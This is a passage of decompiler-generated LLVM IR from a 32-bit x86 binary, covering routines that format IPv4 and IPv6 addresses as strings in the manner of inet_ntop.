  %v0_80512f6 = load i32, i32* @eax, align 4
  %v3_80512fa = and i32 %v0_80512f6, -65536
  store i32 %v3_80512fa, i32* %stack_var_-33, align 4
  %v2_8051305 = ptrtoint i32* %stack_var_-31 to i32
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805130b = load i32, i32* @edx, align 4
  %v0_805130f = load i32, i32* @ecx, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_8051315 = add i32 %v2_8051305, 4
  store i32 %v6_8051315, i32* %edi.global-to-local, align 4
  %v2_8051316 = inttoptr i32 %v6_8051315 to i32*
  store i32 0, i32* %v2_8051316, align 4
  %v3_8051316 = load i32, i32* %edi.global-to-local, align 4
  %v6_8051316 = add i32 %v3_8051316, 4
  store i32 %v6_8051316, i32* %edi.global-to-local, align 4
  %v0_8051317 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051317 = inttoptr i32 %v6_8051316 to i32*
  store i32 %v0_8051317, i32* %v2_8051317, align 4
  %v3_8051317 = load i32, i32* %edi.global-to-local, align 4
  %v6_8051317 = add i32 %v3_8051317, 4
  store i32 %v6_8051317, i32* %edi.global-to-local, align 4
  %v0_8051318 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051318 = trunc i32 %v0_8051318 to i16
  %v3_8051318 = inttoptr i32 %v6_8051317 to i16*
  store i16 %v1_8051318, i16* %v3_8051318, align 2
  %v4_8051318 = load i32, i32* %edi.global-to-local, align 4
  %v7_8051318 = add i32 %v4_8051318, 2
  store i32 %v7_8051318, i32* %edi.global-to-local, align 4
  %v0_805131a = load i32, i32* %eax.global-to-local, align 4
  %v1_805131a = trunc i32 %v0_805131a to i8
  %v3_805131a = inttoptr i32 %v7_8051318 to i8*
  store i8 %v1_805131a, i8* %v3_805131a, align 1
  %v4_805131a = load i32, i32* %edi.global-to-local, align 4
  %v5_805131a = load i1, i1* @df, align 1
  %v6_805131a = select i1 %v5_805131a, i32 -1, i32 1
  %v7_805131a = add i32 %v6_805131a, %v4_805131a
  store i32 %v7_805131a, i32* @edi, align 4
  %v0_80513aa20 = load i32, i32* %ebp.global-to-local, align 4
  %v7_80513ad23 = icmp sgt i32 %v0_80513aa20, 3
  br i1 %v7_80513ad23, label %dec_label_pc_80513b3, label %dec_label_pc_8051320

dec_label_pc_8051320:                             ; preds = %dec_label_pc_80512ec, %dec_label_pc_8051388
  %v0_80513aa24 = phi i32 [ %v0_80513aa, %dec_label_pc_8051388 ], [ %v0_80513aa20, %dec_label_pc_80512ec ]
  %v0_8051324 = load i32, i32* @ecx, align 4
  %v1_8051324 = and i32 %v0_8051324, -256
  %v2_8051324 = or i32 %v1_8051324, 100
  store i32 %v2_8051324, i32* %ecx.global-to-local, align 4
  %v2_8051326 = add i32 %v0_80513aa24, %v0_80512f6
  store i32 %v2_8051326, i32* %eax.global-to-local, align 4
  %v0_8051328 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051328 = add i32 %v0_8051328, 1
  store i32 %v1_8051328, i32* @esi, align 4
  store i32 %v0_8051328, i32* @edi, align 4
  %v1_8051331 = inttoptr i32 %v2_8051326 to i8*
  %v2_8051331 = load i8, i8* %v1_8051331, align 1
  %v3_8051331 = zext i8 %v2_8051331 to i32
  %v4_8051331 = load i32, i32* @edx, align 4
  %v5_8051331 = and i32 %v4_8051331, -65536
  %v6_8051331 = or i32 %v5_8051331, %v3_8051331
  store i32 %v6_8051331, i32* %edx.global-to-local, align 4
  %div = udiv i8 %v2_8051331, 100
  %v6_8051337 = zext i8 %div to i32
  %v4_8051339 = or i32 %v6_8051337, %v1_8051324
  store i32 %v4_8051339, i32* %ecx.global-to-local, align 4
  %v1_805133b = or i32 %v4_8051339, 48
  store i32 %v1_805133b, i32* %eax.global-to-local, align 4
  %v1_805133e = trunc i32 %v1_805133b to i8
  %v2_805133e = load i32, i32* @esp, align 4
  %v4_805133e = add i32 %v0_8051328, 43
  %v5_805133e = add i32 %v4_805133e, %v2_805133e
  %v6_805133e = inttoptr i32 %v5_805133e to i8*
  store i8 %v1_805133e, i8* %v6_805133e, align 1
  %v0_8051342 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051342 = trunc i32 %v0_8051342 to i8
  %v7_8051342 = icmp eq i8 %v1_8051342, 48
  %v1_8051344 = icmp eq i1 %v7_8051342, false
  %v0_805136a = load i32, i32* %ecx.global-to-local, align 4
  %v1_805136a = and i32 %v0_805136a, -256
  %v2_805136a = or i32 %v1_805136a, 10
  store i32 %v2_805136a, i32* %ecx.global-to-local, align 4
  %v0_805136c = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805136c, i32* %eax.global-to-local, align 4
  %v3_805136e = trunc i32 %v0_805136c to i16
  %v5_805136e = udiv i16 %v3_805136e, 10
  br i1 %v1_8051344, label %dec_label_pc_805136a, label %dec_label_pc_8051346

dec_label_pc_8051346:                             ; preds = %dec_label_pc_8051320
  %v9_805134a = and i32 %v0_805136c, -65536
  %tmp = urem i16 %v5_805136e, 256
  store i32 10, i32* %ecx.global-to-local, align 4
  %div26 = udiv i16 %tmp, 10
  %v7_8051357 = zext i16 %div26 to i32
  %v11_8051357 = or i32 %v7_8051357, %v9_805134a
  store i32 %v11_8051357, i32* %eax.global-to-local, align 4
  %tmp28 = urem i16 %tmp, 10
  %v12_8051357 = zext i16 %tmp28 to i32
  %v1_805135a = or i32 %v12_8051357, 48
  %v8_805135a = trunc i32 %v1_805135a to i8
  store i32 %v1_805135a, i32* %edx.global-to-local, align 4
  %v2_805135d = load i32, i32* @esp, align 4
  %v3_805135d = load i32, i32* %ebx.global-to-local, align 4
  %v4_805135d = add i32 %v2_805135d, 43
  %v5_805135d = add i32 %v4_805135d, %v3_805135d
  %v6_805135d = inttoptr i32 %v5_805135d to i8*
  store i8 %v8_805135a, i8* %v6_805135d, align 1
  %v0_8051361 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051361 = trunc i32 %v0_8051361 to i8
  %v7_8051361 = icmp eq i8 %v1_8051361, 48
  br i1 %v7_8051361, label %dec_label_pc_8051388, label %dec_label_pc_8051366

dec_label_pc_8051366:                             ; preds = %dec_label_pc_8051346
  %v0_8051366 = load i32, i32* @esi, align 4
  store i32 %v0_8051366, i32* @edi, align 4
  br label %dec_label_pc_8051388

dec_label_pc_805136a:                             ; preds = %dec_label_pc_8051320
  %tmp29 = urem i16 %v5_805136e, 256
  %v3_8051370 = and i32 %v0_805136c, -65536
  store i32 10, i32* %ecx.global-to-local, align 4
  %div27 = udiv i16 %tmp29, 10
  %v7_805137b = zext i16 %div27 to i32
  %v11_805137b = or i32 %v7_805137b, %v3_8051370
  store i32 %v11_805137b, i32* %eax.global-to-local, align 4
  %tmp30 = urem i16 %tmp29, 10
  %v12_805137b = zext i16 %tmp30 to i32
  %v1_805137e = or i32 %v12_805137b, 48
  %v8_805137e = trunc i32 %v1_805137e to i8
  store i32 %v1_805137e, i32* %edx.global-to-local, align 4
  %v0_8051381 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051381 = add i32 %v0_8051381, 2
  store i32 %v1_8051381, i32* @edi, align 4
  %v2_8051384 = load i32, i32* @esp, align 4
  %v3_8051384 = load i32, i32* @esi, align 4
  %v4_8051384 = add i32 %v2_8051384, 43
  %v5_8051384 = add i32 %v4_8051384, %v3_8051384
  %v6_8051384 = inttoptr i32 %v5_8051384 to i8*
  store i8 %v8_805137e, i8* %v6_8051384, align 1
  br label %dec_label_pc_8051388

dec_label_pc_8051388:                             ; preds = %dec_label_pc_8051346, %dec_label_pc_8051366, %dec_label_pc_805136a
  store i32 %v2_8051326, i32* %edx.global-to-local, align 4
  store i32 10, i32* @ecx, align 4
  %v0_8051391 = load i32, i32* @edi, align 4
  %v1_8051391 = add i32 %v0_8051391, 2
  store i32 %v1_8051391, i32* %ebx.global-to-local, align 4
  %v0_8051394 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051394 = add i32 %v0_8051394, 1
  store i32 %v1_8051394, i32* %ebp.global-to-local, align 4
  %v2_8051395 = load i8, i8* %v1_8051331, align 1
  %v3_8051395 = zext i8 %v2_8051395 to i32
  %v4_8051395 = load i32, i32* %eax.global-to-local, align 4
  %v5_8051395 = and i32 %v4_8051395, -65536
  %v6_8051395 = or i32 %v5_8051395, %v3_8051395
  store i32 %v6_8051395, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_805139b = load i32, i32* @esp, align 4
  %v2_805139b = add i32 %v0_8051391, 44
  %v3_805139b = add i32 %v2_805139b, %v0_805139b
  %v4_805139b = inttoptr i32 %v3_805139b to i8*
  store i8 46, i8* %v4_805139b, align 1
  %v0_80513a0 = load i32, i32* @ecx, align 4
  %v1_80513a0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80513a0 = urem i32 %v1_80513a0, 65536
  %v3_80513a0 = load i32, i32* %edx.global-to-local, align 4
  %v4_80513a0 = mul i32 %v3_80513a0, 65536
  %v5_80513a0 = or i32 %v4_80513a0, %v2_80513a0
  %v6_80513a0 = urem i32 %v0_80513a0, 65536
  %v7_80513a0 = udiv i32 %v5_80513a0, %v6_80513a0
  %v8_80513a0 = urem i32 %v7_80513a0, 65536
  %v10_80513a0 = and i32 %v1_80513a0, -65536
  %v11_80513a0 = or i32 %v8_80513a0, %v10_80513a0
  store i32 %v11_80513a0, i32* %eax.global-to-local, align 4
  %v12_80513a0 = urem i32 %v5_80513a0, %v6_80513a0
  %v14_80513a0 = and i32 %v3_80513a0, -65536
  %v15_80513a0 = or i32 %v12_80513a0, %v14_80513a0
  %v1_80513a3 = add i32 %v15_80513a0, 48
  %v8_80513a3 = trunc i32 %v1_80513a3 to i8
  store i32 %v1_80513a3, i32* @edx, align 4
  %v2_80513a6 = load i32, i32* @esp, align 4
  %v3_80513a6 = load i32, i32* @edi, align 4
  %v4_80513a6 = add i32 %v2_80513a6, 43
  %v5_80513a6 = add i32 %v4_80513a6, %v3_80513a6
  %v6_80513a6 = inttoptr i32 %v5_80513a6 to i8*
  store i8 %v8_80513a3, i8* %v6_80513a6, align 1
  %v0_80513aa = load i32, i32* %ebp.global-to-local, align 4
  %v7_80513ad = icmp sgt i32 %v0_80513aa, 3
  br i1 %v7_80513ad, label %dec_label_pc_80513b3, label %dec_label_pc_8051320

dec_label_pc_80513b3:                             ; preds = %dec_label_pc_8051388, %dec_label_pc_80512ec
  %v0_80513b3 = load i32, i32* @esp, align 4
  %v1_80513b3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80513b3 = add i32 %v0_80513b3, 42
  %v3_80513b3 = add i32 %v2_80513b3, %v1_80513b3
  %v4_80513b3 = inttoptr i32 %v3_80513b3 to i8*
  store i8 0, i8* %v4_80513b3, align 1
  %v2_80513bb = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_80513bb, i32* %ebx.global-to-local, align 4
  store i32 %v2_80513bb, i32* %stack_var_-92, align 4
  %v1_80513c0 = bitcast i32* %stack_var_-33 to i8*
  %v2_80513c0 = call i32 @function_804ce94(i8* %v1_80513c0)
  store i32 %v2_80513c0, i32* @eax, align 4
  %tmp25 = icmp ugt i32 %v2_80513c0, %v0_805130f
  br i1 %tmp25, label %dec_label_pc_80513ce, label %dec_label_pc_80513dd

dec_label_pc_80513ce:                             ; preds = %dec_label_pc_80513b3
  %v0_80513ce = load i32, i32* %stack_var_-92, align 4
  %v1_80513ce = call i32 @function_804b4bc(i32 %v0_80513ce)
  %v1_80513d3 = inttoptr i32 %v1_80513ce to i32*
  store i32 28, i32* %v1_80513d3, align 4
  br label %dec_label_pc_80513ec

dec_label_pc_80513dd:                             ; preds = %dec_label_pc_80513b3
  store i32 %v0_805130b, i32* %stack_var_-92, align 4
  %v2_80513e4 = inttoptr i32 %v0_805130b to i8*
  %v3_80513e4 = call i32 @function_804ce78(i8* %v2_80513e4, i32 %v2_80513bb)
  br label %dec_label_pc_80513ec

dec_label_pc_80513ec:                             ; preds = %dec_label_pc_80513ce, %dec_label_pc_80513dd
  %storemerge = phi i32 [ %v3_80513e4, %dec_label_pc_80513dd ], [ 0, %dec_label_pc_80513ce ]
  %v0_80513f3 = phi i32 [ %v3_80513e4, %dec_label_pc_80513dd ], [ 0, %dec_label_pc_80513ce ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80512ee, i32* @esi, align 4
  store i32 %v0_80512ed, i32* @edi, align 4
  ret i32 %v0_80513f3

; uselistorder directives
  uselistorder i32 %v0_80513aa, { 1, 0 }
  uselistorder i32 %v3_80513a0, { 1, 0 }
  uselistorder i32 %v1_80513a0, { 1, 0 }
  uselistorder i32 %v1_805137e, { 1, 0 }
  uselistorder i32 %v1_805135a, { 1, 0 }
  uselistorder i32 %v0_805136c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805133b, { 1, 0 }
  uselistorder i32 %v0_805130b, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i32* %stack_var_-92, { 1, 0, 2 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i16 10, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8 48, { 0, 1, 9, 10, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder i32 43, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32 100, { 4, 0, 2, 3, 1 }
  uselistorder i32 -65536, { 2, 3, 4, 1, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_80513ec, { 1, 0 }
  uselistorder label %dec_label_pc_8051388, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051320, { 1, 0 }
}

define i32 @function_80513f4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80513f4:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_80513f5 = load i32, i32* @edi, align 4
  %v0_80513f6 = load i32, i32* @esi, align 4
  %v0_80513f7 = load i32, i32* @ebx, align 4
  %v15_80513f8 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_80513ff = icmp eq i32 %arg1, 2
  br i1 %v9_80513ff, label %dec_label_pc_805140f, label %dec_label_pc_8051404

dec_label_pc_8051404:                             ; preds = %dec_label_pc_80513f4
  %v9_8051404 = icmp eq i32 %arg1, 10
  %v1_8051407 = icmp eq i1 %v9_8051404, false
  br i1 %v1_8051407, label %dec_label_pc_80515ab, label %dec_label_pc_8051427

dec_label_pc_805140f:                             ; preds = %dec_label_pc_80513f4
  store i32 %arg3, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_805141b = call i32 @function_80512ec(i32 %v0_80513f7, i32 %v0_80513f6, i32 %v0_80513f5)
  store i32 %v3_805141b, i32* %eax.global-to-local, align 4
  store i32 %v3_805141b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80515b8

dec_label_pc_8051427:                             ; preds = %dec_label_pc_8051404
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_805142c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805142c, i32* %eax.global-to-local, align 4
  store i32 %v2_805142c, i32* %stack_var_-124, align 4
  %v4_8051431 = bitcast i32* %stack_var_-48 to i8*
  %v5_8051431 = call i32 @function_804ce60(i8* %v4_8051431, i32 0, i32 32)
  store i32 %v5_8051431, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8051453 = add i32 %arg2, 1
  br label %dec_label_pc_805143d

dec_label_pc_805143d:                             ; preds = %dec_label_pc_805143d.dec_label_pc_805143d_crit_edge, %dec_label_pc_8051427
  %v1_8051460 = phi i32 [ %v15_80513f8, %dec_label_pc_8051427 ], [ %v1_8051460.pre, %dec_label_pc_805143d.dec_label_pc_805143d_crit_edge ]
  %v0_805145b68 = phi i32 [ 0, %dec_label_pc_8051427 ], [ %v0_8051464.pre, %dec_label_pc_805143d.dec_label_pc_805143d_crit_edge ]
  %v1_8051446 = ashr i32 %v0_805145b68, 31
  %v2_8051447 = zext i32 %v0_805145b68 to i64
  %v4_8051447 = zext i32 %v1_8051446 to i64
  %v5_8051447 = mul nuw i64 %v4_8051447, 4294967296
  %v6_8051447 = or i64 %v5_8051447, %v2_8051447
  %v8_8051447 = sdiv i64 %v6_8051447, 2
  %v9_8051447 = trunc i64 %v8_8051447 to i32
  store i32 %v9_8051447, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_8051447, i32* %ebx.global-to-local, align 4
  %v2_805144f = add i32 %v0_805145b68, %arg2
  %v3_805144f = inttoptr i32 %v2_805144f to i8*
  %v4_805144f = load i8, i8* %v3_805144f, align 1
  %v5_805144f = zext i8 %v4_805144f to i32
  store i32 %v5_805144f, i32* %eax.global-to-local, align 4
  %v3_8051453 = add i32 %v2_8051453, %v0_805145b68
  %v4_8051453 = inttoptr i32 %v3_8051453 to i8*
  %v5_8051453 = load i8, i8* %v4_8051453, align 1
  %v6_8051453 = zext i8 %v5_8051453 to i32
  store i32 %v6_8051453, i32* %edx.global-to-local, align 4
  %v2_8051458 = mul nuw nsw i32 %v5_805144f, 256
  %v1_805145b = add i32 %v0_805145b68, 2
  store i32 %v1_805145b, i32* %ecx.global-to-local, align 4
  %v2_805145e = or i32 %v6_8051453, %v2_8051458
  store i32 %v2_805145e, i32* %eax.global-to-local, align 4
  %v3_8051460 = mul i32 %v9_8051447, 4
  %v4_8051460 = add i32 %v3_8051460, 60
  %v5_8051460 = add i32 %v4_8051460, %v1_8051460
  %v6_8051460 = inttoptr i32 %v5_8051460 to i32*
  store i32 %v2_805145e, i32* %v6_8051460, align 4
  %v0_8051464.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8051467 = icmp sgt i32 %v0_8051464.pre, 15
  br i1 %v7_8051467, label %dec_label_pc_8051469, label %dec_label_pc_805143d.dec_label_pc_805143d_crit_edge

dec_label_pc_805143d.dec_label_pc_805143d_crit_edge: ; preds = %dec_label_pc_805143d
  %v1_8051460.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805143d

dec_label_pc_8051469:                             ; preds = %dec_label_pc_805143d
  %v4_8051427 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8051473.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051473

dec_label_pc_8051473:                             ; preds = %dec_label_pc_8051469, %dec_label_pc_80514a0
  %v0_80514a067 = phi i32 [ 0, %dec_label_pc_8051469 ], [ %v1_80514a0, %dec_label_pc_80514a0 ]
  %v0_805148b66 = phi i32 [ -1, %dec_label_pc_8051469 ], [ %v0_805148b7, %dec_label_pc_80514a0 ]
  %v0_80514ab65 = phi i32 [ -1, %dec_label_pc_8051469 ], [ %v0_80514908, %dec_label_pc_80514a0 ]
  %v0_80514b664 = phi i32 [ -1, %dec_label_pc_8051469 ], [ %v0_805149b12, %dec_label_pc_80514a0 ]
  %v2_8051473 = mul nuw nsw i32 %v0_80514a067, 4
  %v3_8051473 = add nuw nsw i32 %v2_8051473, 60
  %v4_8051473 = add i32 %v3_8051473, %v0_8051473.pre
  %v5_8051473 = inttoptr i32 %v4_8051473 to i32*
  %v6_8051473 = load i32, i32* %v5_8051473, align 4
  %v7_8051473 = icmp eq i32 %v6_8051473, 0
  %v1_8051478 = icmp eq i1 %v7_8051473, false
  %v10_805148b = icmp eq i32 %v0_805148b66, -1
  br i1 %v1_8051478, label %dec_label_pc_805148b, label %dec_label_pc_805147a

dec_label_pc_805147a:                             ; preds = %dec_label_pc_8051473
  %v1_805147d = icmp eq i1 %v10_805148b, false
  br i1 %v1_805147d, label %dec_label_pc_8051488, label %dec_label_pc_805147f

dec_label_pc_805147f:                             ; preds = %dec_label_pc_805147a
  store i32 %v0_80514a067, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80514a0

dec_label_pc_8051488:                             ; preds = %dec_label_pc_805147a
  %v0_8051488 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051488 = add i32 %v0_8051488, 1
  store i32 %v1_8051488, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80514a0

dec_label_pc_805148b:                             ; preds = %dec_label_pc_8051473
  br i1 %v10_805148b, label %dec_label_pc_80514a0, label %dec_label_pc_8051490

dec_label_pc_8051490:                             ; preds = %dec_label_pc_805148b
  %v10_8051490 = icmp eq i32 %v0_80514ab65, -1
  %v0_8051499.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051495 = load i32, i32* @ebp, align 4
  %v7_8051497 = icmp sgt i32 %v0_8051499.pre, %v1_8051495
  %or.cond = or i1 %v10_8051490, %v7_8051497
  br i1 %or.cond, label %dec_label_pc_8051499, label %dec_label_pc_805149d

dec_label_pc_8051499:                             ; preds = %dec_label_pc_8051490
  store i32 %v0_8051499.pre, i32* @ebp, align 4
  store i32 %v0_80514b664, i32* @edi, align 4
  br label %dec_label_pc_805149d

dec_label_pc_805149d:                             ; preds = %dec_label_pc_8051490, %dec_label_pc_8051499
  %v0_805149010 = phi i32 [ %v0_80514b664, %dec_label_pc_8051499 ], [ %v0_80514ab65, %dec_label_pc_8051490 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80514a0

dec_label_pc_80514a0:                             ; preds = %dec_label_pc_805148b, %dec_label_pc_8051488, %dec_label_pc_805147f, %dec_label_pc_805149d
  %v0_805149b12 = phi i32 [ %v0_80514b664, %dec_label_pc_805148b ], [ %v0_80514b664, %dec_label_pc_8051488 ], [ %v0_80514a067, %dec_label_pc_805147f ], [ -1, %dec_label_pc_805149d ]
  %v0_805148b7 = phi i32 [ -1, %dec_label_pc_805148b ], [ %v0_805148b66, %dec_label_pc_8051488 ], [ %v0_80514a067, %dec_label_pc_805147f ], [ -1, %dec_label_pc_805149d ]
  %v0_80514908 = phi i32 [ %v0_80514ab65, %dec_label_pc_805148b ], [ %v0_80514ab65, %dec_label_pc_8051488 ], [ %v0_80514ab65, %dec_label_pc_805147f ], [ %v0_805149010, %dec_label_pc_805149d ]
  %v1_80514a0 = add nuw nsw i32 %v0_80514a067, 1
  store i32 %v1_80514a0, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_80514a0, 8
  br i1 %exitcond, label %dec_label_pc_80514a6, label %dec_label_pc_8051473

dec_label_pc_80514a6:                             ; preds = %dec_label_pc_80514a0
  %v10_80514a6 = icmp eq i32 %v0_805149b12, -1
  br i1 %v10_80514a6, label %dec_label_pc_80514b8, label %dec_label_pc_80514ab

dec_label_pc_80514ab:                             ; preds = %dec_label_pc_80514a6
  %v10_80514ab = icmp eq i32 %v0_80514908, -1
  %v0_80514b4.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_80514ab, label %dec_label_pc_80514b4, label %dec_label_pc_80514b0

dec_label_pc_80514b0:                             ; preds = %dec_label_pc_80514ab
  %v1_80514b0 = load i32, i32* @ebp, align 4
  %v7_80514b2 = icmp sgt i32 %v0_80514b4.pre, %v1_80514b0
  br i1 %v7_80514b2, label %dec_label_pc_80514b4, label %dec_label_pc_80514b8.thread

dec_label_pc_80514b8.thread:                      ; preds = %dec_label_pc_80514b0
  br label %dec_label_pc_80514bd

dec_label_pc_80514b4:                             ; preds = %dec_label_pc_80514ab, %dec_label_pc_80514b0
  store i32 %v0_80514b4.pre, i32* @ebp, align 4
  store i32 %v0_805149b12, i32* @edi, align 4
  br label %dec_label_pc_80514b8

dec_label_pc_80514b8:                             ; preds = %dec_label_pc_80514a6, %dec_label_pc_80514b4
  %v0_80514b8 = phi i32 [ %v0_80514908, %dec_label_pc_80514a6 ], [ %v0_805149b12, %dec_label_pc_80514b4 ]
  %v10_80514b8 = icmp eq i32 %v0_80514b8, -1
  br i1 %v10_80514b8, label %dec_label_pc_80514c5, label %dec_label_pc_80514b8.dec_label_pc_80514bd_crit_edge

dec_label_pc_80514b8.dec_label_pc_80514bd_crit_edge: ; preds = %dec_label_pc_80514b8
  %v0_80514bd.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80514bd

dec_label_pc_80514bd:                             ; preds = %dec_label_pc_80514b8.dec_label_pc_80514bd_crit_edge, %dec_label_pc_80514b8.thread
  %v0_80514bd = phi i32 [ %v1_80514b0, %dec_label_pc_80514b8.thread ], [ %v0_80514bd.pre, %dec_label_pc_80514b8.dec_label_pc_80514bd_crit_edge ]
  %v0_80514b845 = phi i32 [ %v0_80514908, %dec_label_pc_80514b8.thread ], [ %v0_80514b8, %dec_label_pc_80514b8.dec_label_pc_80514bd_crit_edge ]
  %v1_80514bd = add i32 %v0_80514bd, -1
  %v6_80514bd = sub i32 0, %v0_80514bd
  %v7_80514bd = and i32 %v0_80514bd, %v6_80514bd
  %v8_80514bd = icmp slt i32 %v7_80514bd, 0
  %v9_80514bd = icmp eq i32 %v1_80514bd, 0
  %v10_80514bd = icmp slt i32 %v1_80514bd, 0
  %v3_80514c0 = icmp eq i1 %v10_80514bd, %v8_80514bd
  %v4_80514c0 = icmp eq i1 %v9_80514bd, false
  %v5_80514c0 = and i1 %v4_80514c0, %v3_80514c0
  br i1 %v5_80514c0, label %dec_label_pc_80514c5, label %dec_label_pc_80514c2

dec_label_pc_80514c2:                             ; preds = %dec_label_pc_80514bd
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_80514c5

dec_label_pc_80514c5:                             ; preds = %dec_label_pc_80514bd, %dec_label_pc_80514b8, %dec_label_pc_80514c2
  %v0_805156517 = phi i32 [ %v0_80514b845, %dec_label_pc_80514bd ], [ -1, %dec_label_pc_80514b8 ], [ -1, %dec_label_pc_80514c2 ]
  %v2_80514c5 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_80514c5, i32* @ebx, align 4
  %v3_8051547 = add i32 %v4_8051427, 64
  %v12_8051505 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_805156557 = icmp eq i32 %v0_805156517, -1
  %v1_805150d = icmp eq i1 %v12_8051505, false
  br label %dec_label_pc_80514d0

dec_label_pc_80514d0:                             ; preds = %dec_label_pc_80514c5, %dec_label_pc_805155b
  %v10_805156563 = phi i1 [ %v10_805156557, %dec_label_pc_80514c5 ], [ %v10_8051565, %dec_label_pc_805155b ]
  %v0_80514ea62 = phi i32 [ 0, %dec_label_pc_80514c5 ], [ %v1_805155b, %dec_label_pc_805155b ]
  %v1_80514e061 = phi i32 [ %v0_805156517, %dec_label_pc_80514c5 ], [ %v0_8051565.pre, %dec_label_pc_805155b ]
  %v0_80514ee60 = phi i32 [ %v2_80514c5, %dec_label_pc_80514c5 ], [ %v0_80514e418, %dec_label_pc_805155b ]
  %stack_var_-120.159 = phi i8* [ null, %dec_label_pc_80514c5 ], [ %stack_var_-120.0, %dec_label_pc_805155b ]
  %stack_var_-116.158 = phi i32 [ 32, %dec_label_pc_80514c5 ], [ %stack_var_-116.0, %dec_label_pc_805155b ]
  br i1 %v10_805156563, label %dec_label_pc_80514ea, label %dec_label_pc_80514d5

dec_label_pc_80514d5:                             ; preds = %dec_label_pc_80514d0
  %v12_80514d5 = icmp eq i32 %v0_80514ea62, %v1_80514e061
  %v5_80514d7 = icmp slt i32 %v0_80514ea62, %v1_80514e061
  br i1 %v5_80514d7, label %dec_label_pc_80514ea, label %dec_label_pc_80514d9

dec_label_pc_80514d9:                             ; preds = %dec_label_pc_80514d5
  %v1_80514d9 = load i32, i32* @ebp, align 4
  %v2_80514d9 = add i32 %v1_80514d9, %v1_80514e061
  store i32 %v2_80514d9, i32* %eax.global-to-local, align 4
  %v5_80514de = icmp slt i32 %v0_80514ea62, %v2_80514d9
  br i1 %v5_80514de, label %dec_label_pc_80514e0, label %dec_label_pc_80514ea

dec_label_pc_80514e0:                             ; preds = %dec_label_pc_80514d9
  %v1_80514e2 = icmp eq i1 %v12_80514d5, false
  br i1 %v1_80514e2, label %dec_label_pc_805155b, label %dec_label_pc_80514e4

dec_label_pc_80514e4:                             ; preds = %dec_label_pc_80514e0
  %v1_80514e4 = inttoptr i32 %v0_80514ee60 to i8*
  store i8 58, i8* %v1_80514e4, align 1
  %v0_80514e7 = load i32, i32* @ebx, align 4
  %v1_80514e7 = add i32 %v0_80514e7, 1
  store i32 %v1_80514e7, i32* @ebx, align 4
  br label %dec_label_pc_805155b

dec_label_pc_80514ea:                             ; preds = %dec_label_pc_80514d9, %dec_label_pc_80514d5, %dec_label_pc_80514d0
  %v1_80514ea = icmp eq i32 %v0_80514ea62, 0
  br i1 %v1_80514ea, label %dec_label_pc_80514f2.thread, label %dec_label_pc_80514f2

dec_label_pc_80514f2.thread:                      ; preds = %dec_label_pc_80514ea
  br label %dec_label_pc_8051546

dec_label_pc_80514f2:                             ; preds = %dec_label_pc_80514ea
  %v1_80514ee = inttoptr i32 %v0_80514ee60 to i8*
